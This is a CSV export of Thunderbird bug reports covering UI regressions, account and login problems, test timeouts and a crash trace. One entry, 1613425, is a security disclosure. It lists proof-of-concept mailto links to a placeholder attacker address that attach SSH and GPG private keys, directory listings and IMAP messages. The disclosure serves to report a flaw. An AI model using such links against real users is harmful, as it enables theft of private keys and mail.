Issue id,Summary,Status,Priority,Resolution,Description
1612456,About & Preferences windows don't appear (on Mac) when there's a master password and security.prompt_for_master_password_on_startup is set to true,RESOLVED,--,WORKSFORME,"The ""About"" box no longer appears, when selected from main menu. OK in Daily 0127, problem appeared in Daily 0128. MacOS 10.14.6 It's a minor pain: current version can be got from Help -> Troubleshooting update on demand is lost; need to wait for update prompt to appear"
1612469,All of my previous emails were deleted without my request. I want them back!,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44 Steps to reproduce: Looked for my emails. Actual results: They're ALL gone, some are a couple years old. I need them back. I do consulting work and rely on them . Expected results: My emails should still be there. No reason they were deleted."
1612480,browser.compose.begin* functions should not expand mailing lists,RESOLVED,--,FIXED,"You can pass a mailing list to the begin functions of browser.compose. Currently it expands the mailing list and adds all of the members to the message recipients. (Or it would if it were not broken.) This shouldn't happen, just the mailing list should be added to the message recipients."
1612526,Sent message is randomly not showing up in gmail Sent Mail,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Sent an email message Actual results: A copy shows up in All Mail but not Sent Mail on Google's IMAP server Expected results: A copy should appear in Sent Mail. Note I have been doing this for years - my client is set up properly to save copies in Sent Mail. It works most of the time. But recently it appears to be sporadically losing messages with no feedback or error message."
1612537,Preview of attached csv files disappeared,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: receive a csv file atached under the body of the message , seeing the content of the csv file Actual results: under the body of the message , not seeing the content of the csv file Expected results: under the body of the message , seeing the content of the csv file"
1612614,Person icon in mailing list dialog too big on HiDPI Macs,RESOLVED,--,FIXED,The person icon in mailing list dialog is too big on HiDPI Macs.
1612625,"""Add Security Exception"" dialog appears too many times to dismiss, if account is repeatedly checked for new messages",UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: The email hosting service for the domain changed. Thunderbird was attempting to check the account every 10 minutes overnight. Actual results: When I came to the computer in the morning, Thunderbird had a dialog: ""Add Security Exception."" I cancelled this dialog, only for another to pop up. Attempted about a dozen times with the same result. Could not exit Thunderbird without doing an ""End Task"" from the operating system. Expected results: Two things: (1) The dialog box is too specific. It assumes the user may want to add a security exception. This is not a meaningful message for an end user, who may know nothing about what happened on the hosting/server end of things. Instead, it should describe what happened, and have a clear option for ""TAKE NO ACTION"" for users who may have no idea what's going on, and may need to contact a system administrator or similar. (2) If this issue happens, either Thunderbird should suspend its auto-checking until it gets some user feedback, or at least, it should not throw multiple instances of the same error message."
1612628,Update Verify failures Thunderbird beta,RESOLVED,--,WORKSFORME,"We see UpdateVerify errors on every beta. https://searchfox.org/mozilla-central/rev/2e355fa82aaa87e8424a9927c8136be184eeb6c7/taskcluster/taskgraph/transforms/update_verify_config.py#40-42 That's one problem. When testing an update from release channel to beta channel update-settings.ini will always have Firefox channels listed. So we need to overwrite mar-channel-id-override in those cases. The other issue is https://searchfox.org/comm-central/rev/4656a6fc05593b508b8a18928d9c9efebe3a7958/taskcluster/ci/build/kind.yml#65 I made that change in an attempt to fix this issue before, and I believe it was the wrong call because the reason for doing that would be to test RC builds which we don't do. I think to fix this we can use use a transform that runs after the update_verify_config transforms and set a new mar-channel-override value that just always gets set for Thunderbird betas."
1612630,Nested Numbered List Will not go above 2,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Click button to add Numbered List 2. Type ""item 1"" 3. Press Enter and Tab 4. Type ""item 1.1"" 5. Press Enter and Shift+Tab 6. Type ""item 2"" 7. Press Enter and Tab 8. Type ""item 2.2"" 9. Press Enter and Shift+Tab 10. Type ""item 3"" 11 Press Enter and Tab 12. Type ""item 3.1"" Actual results: Resulting List is: 1. item 1 1. item 1.1 2. item 2 1. item 2.1 2. item 3 1. item 3.1 Expected results: The third item should start with a 3. There should be a right click menu to restart/rejoin list?"
1612633,Translations missing in german-version (de) maybe in other translations of thunderbird too,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I found some untranslated menu-items like: Undo/Redo, Paste, Copy and Select All is not translated. (Main Menu, Popupmenu). Please see the attatched screenshots. Affected: German translation Actual results: The english/default translation is used. Expected results: The described menu-items and label should be translated."
1612708,Impossible to attach a file to a mail,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: I had tried to join e file to my mail, but it does not appears in the windows supposed to show which file was included in the mail. Beta version 73.0b2 Actual results: No file list of joint files ( finaly, no files included in the mail) Expected results: Get a list of files joint to the mail and joined files"
1612717,No way to re-authenticate OAuth2 accounts if the permission is revoked from the server side(?),RESOLVED,--,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: 1. Log into a Gmail account using OAuth2 2. Change the password of the Google account to log out all clients 3. Launch Thunderbird Actual results: Only a notification popped up saying 'Authentication failure while connecting to server imap.google.com'. Expected results: Apart from the notification, Thunerbird should re-initiate the OAuth2 flow to authenticate itself again."
1612719,Moving Emails from Accounts does not actually Delete Emails.,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: I tried to move emails from one account to another. Sometimes they transfer is completed and the emails disappear. Other times, the count disappears and it stops transferring them. It is currently set to move emails deleted to the trash bin. I just changed it to delete them permanently in the settings for the email accounts. Actual results: With moving to the trash bin picked, moving emails between gmail to outlook account, would transfer. However come back later, and you would see the emails on Gmail being back there. Other times deleting permanently, would do nothing. Likewise, sometimes no error would appear when transferring files, and it would just stop. Expected results: Files moved between email accounts should be deleted, not be redownloaded, or still stay in the folder."
1612765,Extra recipients panel is not keyboard accessible,RESOLVED,--,FIXED,"STR 1) New msg 2) Shift+Tab to reach Extra recipients panel [>>], press Enter 3) try to select any extra recipient with keyboard-only methods (tab, cursor keys) Actual result - Extra recipients panel is not keyboard accessible afasics Expected result - cursor down/up should visibly focus the first/last item of the panel - cursor up/down for navigating panel items, Enter to confirm"
1612796,"Intermittent comm/mail/test/browser/composition/browser_saveChangesOnQuit.js | This test exceeded the timeout threshold. It should be rewritten or split up. If that's not possible, use requestLongerTimeout(N), but only as a last resort. -",RESOLVED,P5,WORKSFORME,**Filed by:** mkmelin+mozilla [at] iki.fi **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287277180&repo=comm-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/PWlrtwJcQIakEYV23klZTg/runs/0/artifacts/public/logs/live_backing.log ---
1612818,"""This message may be a scam"" warning should include details",RESOLVED,--,WONTFIX,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: I opened a message and this warning was displayed at the top: ""This message may be a scam"" which of course was a false positive. Actual results: There is a ""x"" button to dismiss the warning and a ""Preferences"" button which in turn unfolds two options: ignore warning for this message, or edit scam detection preferences. There is, however, no ""Details"" option that will tell me EXACTLY WHY Thunderbird thinks this message is a scam Expected results: There should be a ""Details"" option or something like that, that will tell me EXACTLY WHAT scam detection criteria the message matches, explained in understandable language. It's OBVIOUS that if you tell me that you think a message may be a scam you should also tell me why you think that. Also, how am I supposed to adjust my scam detection preferences (for example, to avoid this false positive in the future) if I don't even know what in this message was detected as suspicious? It's unbelievable that I have to tell you this."
1612853,Message format is not preserved in reply & forward,NEW,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44 Steps to reproduce: 1. Open Tools\Options\Composition\General. 2. Under HTML section change text color. 3. Try forward or reply to some message. Actual results: Previous message color is overridden by composition color. Expected results: Format of previous message is kept. Composition format applies just to new content."
1612884,Error in errorCallback for fetchhttp when setting up Office 365 IMAP account,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Tools -> Account Settings -> Account Actions -> Add Mail Account... Your name: Foo Bar Email address: foo@bar.onmicrosoft.com Password: password Click ""Continue"". I've tried this with real credentials and I get the same error. Actual results: A dialog with: Error in errorCallback for fetchhttp TypeError: e(...) is null Expected results: Configuration succeeded."
1612906,Startup Crash in [@ je_free | nsINIParser_internal::DeleteString],RESOLVED,--,INCOMPLETE,"Signature first appears 68.0, all startup. Perhaps rare enough on the Firefox side to say it doesn't crash. https://crash-stats.mozilla.com/signature/?product=Thunderbird&signature=je_free%20%7C%20nsINIParser_internal%3A%3ADeleteString&date=%3E%3D2019-08-03T15%3A38%3A00.000Z&date=%3C2020-02-03T15%3A38%3A00.000Z#summary bp-509ae74b-ab48-4d4d-b80a-34a110200131. 73.0b1 ``` Top 10 frames of crashing thread: 0 mozglue.dll je_free memory/build/malloc_decls.h:54 1 xul.dll nsINIParser_internal::DeleteString xpcom/base/nsINIParser.cpp 2 xul.dll nsToolkitProfileService::MaybeMakeDefaultDedicatedProfile toolkit/profile/nsToolkitProfileService.cpp:612 3 xul.dll nsToolkitProfileService::SelectStartupProfile toolkit/profile/nsToolkitProfileService.cpp:1484 4 xul.dll XREMain::XRE_mainStartup toolkit/xre/nsAppRunner.cpp:3908 5 xul.dll XREMain::XRE_main toolkit/xre/nsAppRunner.cpp:4727 6 xul.dll XRE_main toolkit/xre/nsAppRunner.cpp:4823 7 thunderbird.exe NS_internal_main comm/mail/app/nsMailApp.cpp:324 8 thunderbird.exe wmain toolkit/xre/nsWindowsWMain.cpp:131 9 thunderbird.exe static int __scrt_common_main_seh f:/dd/vctools/crt/vcstartup/src/startup/exe_common.inl:288 bp-7e423431-fdaa-4149-9220-a9"
1612920,Outlook 365 authentication 68.4.2 broken,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0 Steps to reproduce: Came into work this morning and my Thunderbird that was authenticating fine (I believe with an Office 365 app password) on Friday is not now. I checked the version on the work PC, and saw it was 68.4.2. When I went to my home computer (which I think was still receiving them fine), I saw it *was* 68.4.1, but was prompting for an update to 68.4.1. Sure enough, once I completed that update, now that one fails authentication the same way. I've tried about 5 new app passwords and none of them work. I've tried deleting the account from the password manager, changing the login to something else, trying to login (and failing of course) and then switching it back. None of these workaround attempts work. Actual results: Failure to authenticate, error message reads: Login to server imap-mail.outlook.com with username x@y.z failed. (Retry)/(Enter New Password)/(Cancel) Expected results: Authentication as usual."
1612942,Monospace Font Size Fails to Change Font Size in Plain Text Mail and Compositions,RESOLVED,--,DUPLICATE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: In Thunderbird 68.4.2, the Font Size related to Monospace in the user's mail containing plain text, as well as in composition of plain text messages, fail to honour the Font Size listed in Options > Display > Formatting > Fonts & Colours > Advanced... Actual results: Update Thunderbird to 68.4.2. Expected results: Font Size for Plain Text Messages would be maintined, and therein not now default to frightently tiny font size."
1612957,address list truncated,RESOLVED,--,INCOMPLETE,User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I tried to recreate an address list but could not enter more than 7 entries. Actual results: ALL address lists are truncated to SEVEN entries !!!!
1613004,"Click on composition's attachment pane whitespace should first deselect selected attachments only, shows dialog prematurely",RESOLVED,P3,FIXED,"Deselecting attachments by clicking the whitespace fails. This is a regression. It still works correctly as designed in current release (68.4.2). Click-whitespace-to-attach has been a charming efficiency feature of TB since time immemorial. We can make it even better if we do nothing for multi-select misclicks (see comment 12; not yet included in my current patch). STR 1) composition, add attachments, select one 2) observe attachment pane whitespace tooltip, then click on whitespace Actual - tooltip correctly says ""Clear selection"" - first click however triggers the ""Attach File(s)"" dialog prematurely Expected - per tooltip, IF there's a selection, first click should deselect only, then the next click will show the dialog Note: - click on attachment-less pane shows dialog right away - click on whitespace when there's no selection will show dialog right away - for the impatient, double-click will *always* show the dialog right away - bug 1547699 was explicitly touching this code and should have noticed the regression vs. the described behaviour in code comments, but I can't tell what caused it. Btw: Some other behaviour of the carefully-crafted shortcut-operated attachment pane stat"
1613038,From gets From if Account is binded,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36 Steps to reproduce: I got 2 account binded. mail1@domain.com and mail2@domain.com. mail1@domain.com listens to mail1.1@domain.com (alias), too. Actual results: If i get a mail from mail2@domain.com to mail1.1@domain.com and click on ""answer"" all works fine... From is mail1@domain.com and To is mail2@domain.com But if i get a Mail from mail2@domain.com to mail1@domain.com it gets freaky if i click on answer... From gets mail2@domain.com and To mail1@domain.com... so it swapped completly wrong... Hope its understandful and someone can help ;) Expected results: if mail from mail2@domain.com gets to mail1@domain.com and ich click to answer mail1@domain.com shoild be = FROM and mail2@domain.com = TO"
1613045,No longer able to know who I write to (using a screen reader),RESOLVED,P1,FIXED,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0 Steps to reproduce: With a screen reader such as orca on: 1. Reply to a mail (ctrl-r or reply to) 2. shift-tab until the fields where destination addresses are mentioned So far, the caret reached the addresses and spoke their status (to, Cc etc). Even in the new layout of the window. Now, shift-tab takes the caret on the labels, which should be buttons (cf bug 1611793) but no longer on any address. Impossible then to review the addresses you reply to or you are writing to. Actual results: The caret should be able to go on the addresses, expose them to the screen reader, and they should be removable via del key."
1613090,First available recipient input defaults to BCC instead of To when changing sender to non-default identity with auto-bcc-address,RESOLVED,--,WONTFIX,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Windows 10 OS Thunderbird version 68.4.2 In Account Settings window Select mail account name in left pane click on 'Manage identities' button Select any non default identity (Not an identity set as default) Under 'Copies & Folders' select 'Bcc these email addresses:' and enter an email address. click on all the OKs Click on Write select the non default identity as 'From' Bcc email address is auto entered....as expected. Actual results: However, the next field below is auto set to 'Bcc'. There is no auto display of an empty 'To' field below the preset Bcc. So, you always have to manually change the bcc to TO. Note: this does not occur if you set an auto Bcc with the 'default' identity. In that instance, the auto Bcc is displayed with an empty TO field below. Expected results: The non default identity selected in 'From' should auto display the Bcc as set...so far this is ok....but below that Bcc, the next field should be automatically an empty 'To' field. In addition.... whilst in same Write window, if you then change the 'From' from the non default identity to any other ema"
1613164,zoom images,UNCONFIRMED,--,,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I received an HTML email with an embedded image. The image is too small to read Actual results: I tried to use the mouse-wheel to zoom. The font sized increase but not the image. Expected results: Menu option to zoom the image. Or click and open the image in a new preview window with zoom buttons. Or mousewheel should increase the font and the image size. Or.... anything that avoids having to save the image to disk and use a different program. There's an add-on but outdated: https://addons.thunderbird.net/en-US/thunderbird/addon/image-zoom/
1613181,"""Use proxy for all protocols"" should not copy to SOCKS. (port bug 1610423 to Thunderbird)",RESOLVED,P3,FIXED,"+++ This bug was initially created as a clone of Bug #969282 +++ When using the setting ""use this proxy for all protocols"", putting in the IP/port of a SOCKS proxy doesn't work, even though the proxy details are copied to the SOCKS field. Which is to be expected, because this pref is actually for the HTTP/HTTPS/FTP protocols. A SOCKS proxy accepts all connections, so putting it with stuff it would override doesn't make much sense. Besides, while HTTP proxies can deal with HTTPS and FTP in a fashion, I have yet to see a proxy that can accept HTTP as well as SOCKS connections. So the copying of the HTTP proxy details into the disabled SOCKS field is a bit misleading since it isn't used. Perhaps the field should be disabled and made empty?"
1613190,gmail password issue - Impossible de configurer un compte GMAIL dans Thunderbird,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: J'utilise plusieurs compte GMAIL différents pour diverses activités. J'ai réussi à les configurer tous les 3 dans Thunderbird, mais j'ai du changer le mot de passe de l'un d'eux. Actual results: Depuis impossible de changer le mot de passe dans Thunderbird pour ce compte. En désespoir de cause, j'ai supprimé le compte pour le recréer mais impossible de le recréer, j'ai toujours le même message : ""Connexion au serveur impossible. La configuration, l'identifiant ou le mot de passe sont probablement incorrects"". J'ai tout vérifié, tout semble bon. J'ai même donné l'autorisation à Thunderbird dans les paramètres du compte Google concerné. J'ai reçu la confirmation suivante dans GMAIL : ""Mozilla Thunderbird Email a désormais accès à votre compte Google"". mais j'ai toujours le même message. Ci-joint le message d'erreur. Expected results: Je souhaite configurer ce compte dans Thunderbird."
1613213,Intermittent comm/mail/components/extensions/test/browser/browser_ext_messageDisplay.js | Test timed out -,RESOLVED,P5,WORKSFORME,**Filed by:** mkmelin+mozilla [at] iki.fi **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287380387&repo=comm-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/O8zi-nSeRhS1SASo-8G-OQ/runs/0/artifacts/public/logs/live_backing.log ---
1613217,Thunderbird - Provider Sunrise.ch - does not synchronize,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Windows 10. Thunderbird 68.4.2 installed. New account sunrise.ch according to https://www.sunrise.ch/de/privatkunden/hilfe/mobile/mobile-einrichten/hardware-support.html?seite=device/windows/thunderbird Actual results: ""Anmeldung auf dem Server imap.sunrise.ch mit Benutzernamen ""Hermann.Taaks@sunrise.ch"" fehlgeschlagen"" = registration on server imap.sunrise.ch with user name ---without success Expected results: synchronization, i.e. emails received on the sunrise mail server should be forwarded to my laptop"
1613243,Email address autocomplete suggestions have inconsistent ordering,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I type a name in the 'To' line within the message compose window. Thunderbird offers a set of matching names from the address book. Actual results: Thunderbird offers a set of matching names from the address book. However, it seems to offer these in an inconsistent order; I don't get the same ordering each time I start a new email. This is awkward when the word(s) which I type match many entries from the address book. I think that this is a regression; this used to work properly in the past, but perhaps not for the last few months. (i.e. it changed sometime in the autumn of 2019) Expected results: If I have multiple people in my address book called Dave, it should show these in some well-defined order. I would prefer if it showed the entries which had been used most recently at the top, because this would normally a useful suggestion. At the very least, given the same words typed into the 'To:' field, it should not randomise the list each time."
1613251,Thunderbird 68.4.2 will not open start page on web when English United States Dictionary 68 ESR is Activated,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: Reinstalled thunderbird with add-ons disabled and it worked. When reactivating The dictionary the start page fails to show up. Disabling dictionary fixes issue"
1613278,Linux32 perma-fail (Thunderbird) TEST-UNEXPECTED-TIMEOUT | toolkit/components/telemetry/tests/unit/test_TelemetrySend.js | Test timed out,RESOLVED,P5,WONTFIX,**Filed by:** geoff [at] darktrojan.net **Parsed log:** https://treeherder.mozilla.org/logviewer.html#?job_id=287519311&repo=comm-central **Full log:** https://firefox-ci-tc.services.mozilla.com/api/queue/v1/task/e986EFyUSgCPQ0NYREFuhA/runs/0/artifacts/public/logs/live_backing.log ---
1613284,Attachment pane view state machinery via keyboard shortcut (Alt+M) regressed,RESOLVED,--,FIXED,"From Bug #1613004, comment 0: Some other behaviour of the carefully-crafted shortcut-operated attachment pane state machinery is also broken (repeated Alt+M), e.g. with a focused but not selected attachment, unexpectedly bringing up the dialog whilst simultaneously hiding the bucket. I'll file this as a stub, we can do more details as we go along."
1613298,Emails appearing with incorrect dates,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 Steps to reproduce: I loaded Thunderbird, which downloaded all my emails from my Yahoo account. Actual results: Everything was correct, except one email. A very old email from 05/02/2011 an 08:00 appeared at the TOP of the chronological list, with a date of 04/02/2020 at 18:11. Expected results: The email should have appeared with the correct date! All other devices (My Android phone, Yahoo's web interface, Android's built in mail app) ALL show this email with the correct date and time, and accordingly it appears among other VERY old emails from 2011. Be aware that this is NOT a case of a duolicate email - it is from a Bank with whom I haven't had an account for years, and details a financial transaction in February 2011"
1613392,from: to: subject filters in global search,RESOLVED,--,DUPLICATE,User Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Try to find via global search an email written by someone who appears in many CC lists. Actual results: There is no easy way to filter messages who were sent from or to someone in global search. There was an add-on with this functionality: https://addons.thunderbird.net/en-US/thunderbird/addon/gmailui/ But it stopped working. This is out-of-the-box functionality in GMail.
1613425,Proprietary mailto?attach=... parameter allows to leak arbitrary files on disk,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36 Steps to reproduce: In the scope of academic research we stumbled over a flaw (feature?) in Thunderbird: By using the proprietary (non-RFC6068) ""mailto?attach=..."" parameter, a website (or other sources for mailto links) can make Thunderbird to attach local files to the composed email. This is arguable a dangerous feature because it allows an attacker to exfiltrate arbitrary files on disk (and also email from the victim's IMAP account), if the victim sends an email based on attacker controlled mailto input and misses the attachment being added. *** Proof-of-concept *** Obtain sensitive files: mailto:sid@evil.com?attach=~/.gnupg/secring.gpg mailto:sid@evil.com?attach=~/.ssh/id_rsa Obtain files without knowning their name: mailto:sid@evil.com?attach=/tmp/*.txt Obtain a full directory listing: mailto:sid@evil.com?attach=~/ Obtain other emails in the victim's inbox: mailto:sid@evil.com?attach=imap:///fetch>UID>/INBOX>1 Note that The existence of the attachment can be further obfuscated, by prepending multiple attach parameters with innocent file names or no file name at"
1613584,"""Update"" button for add-ons vanishes after updating a single add-on",RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I have some add-ons installed, and some of them can be upgraded to more recent versions. By clicking ""Search for updates"", a list of all add-ons with upgrades is shown, and each item in that list one has a button ""Upgrade now"" Actual results: Clicking one single ""Upgrade now"" button upgrades that single add-on. On all other add-ons in the list, the ""Upgrade now"" button is exchanged with two buttons for deactivation or removal of that add-on Expected results: Each other add-on to be upgraded still lists ""Upgrade now"" as an action instead of deactivate/remove"
1613628,Sending of username did not succeed. Mail server pop.sfr.fr responded: internal server error,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 OPR/66.0.3515.44 Steps to reproduce: Since the upgrade to 68.4.1 I keep getting intermittent errors on my pop accounts ""Sending of username did not succeed. Mail server pop.sfr.fr responded: internal server error"" Actual results: Prior to the upgrade I had no problems. I have tested exactley the same settings on another email program and it works fine, Something has changed. My wife has the same issues I am running KDE Neon Linux - fully updated"
1613747,"Some Address Book ""Notes fields"" import mapping to Outlook 2007 wrong",UNCONFIRMED,--,,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: 1. Export Addresses as CSV. 2. Then import into Outlook 2007. Actual results: The Notes Field entry ""line"" from Thunderbird, import as separate new Contacts in Outlook. Also, some Outlook FULL NAME field contain email address, phone number, etc. from TB Address entry. Expected results: All Addresses/Notes field entries should import as Notes in Outlook as Notes for a given contact. Only the Full name should appear in the Outlook contact. The email address, etc. from TB should be mapped into the appropriate Outlook field. Many Outlook Contact entry mappings are prefect."
1613752,signal-spam system penalizes thunderbird in favour of competitors,RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 Steps to reproduce: I think there is a bug into this add-on. I filed a ticket to the https://www.signal-spam.fr/ team but the support doesn't reply. Now, I warn the Thunderbird team that the signal spam extension for Thunderbird penalizes the Thunderbird comparing to other email softwares. Actual results: I can't open links from an email into my web browser (Firefox) when I enable the signal-spam 3.0.5 addon for Thunderbird. If I disable this addon, then Thunderbird is able to open email links into Firefox. Expected results: Signal spam shouldn't prevent opening links outside Thunderbird. This spam fighting system became quite essential for me during the last years."
1613774,fonts not recognized for received messages - message pane is blank,RESOLVED,--,WORKSFORME,"User Agent: Mozilla/5.0 (X11; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Try to read message. Actual results: Message text is not displayed - pane is blank. Expected results: With version 68.4.2 I'm seeing a high frequency of messages for which thunderbird can't seem to identify the source font(s). But ...... when opening ""reply to sender"" the complete source text is displayed. Clearly the source fonts can be identified in these cases - so why can't the message be displayed on ""reading"" but can be correctly displayed on ""responding""???"
1613856,Copy of Accounts causes error,RESOLVED,--,INCOMPLETE,"User Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: I copied my accounts (folder) from the origin PC, Version 68.4.2. On the Target PC I installed Thunderbird, version 68.4.2. Like described on the mozilla website for transfering accounts from a PC to another PC, I did all the same steps. I tried a lot of times with de-installing, installing, open with accounts and without. Actual results: The first time Thunderbird startet and everything went well. All accounts are availbale and access to the accounts on the origin webpages went successfull. After closing Thunderbird and open again the error occurs, Thunderbird crashes, see attached file. Without copying my accounts the error does not accour, Thunderbird is starting without an crashes. Expected results: Starting every time without crashing"
1613892,Change of spelling dictionarry not possible,RESOLVED,--,INVALID,User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0 Steps to reproduce: Spell checking new message: There is Ecglish as only language in dropddown (OS language is German as ssshown in preferences. too). Actual results: Adding other languages - Installing - success message of install. But even a restart will not change or show German language in dropdown list. Same with other language (French). Manual download and start of xpi ends the same way. Other way of manujal istallation not found Expected results: possible change of language or even German as general language
1613913,"text attachments do not display inline in the body of the email in the display window even when ""Display attachments inline"" is selected.",RESOLVED,--,INVALID,"User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36 Steps to reproduce: I sent myself a plain text file (.txt) as an attachment. Under the ""View"" tab I selected ""View attachments inline"". Actual results: The message did not display in the message display window Expected results: The message should have displayed in the message display window. This was working until the latest update."
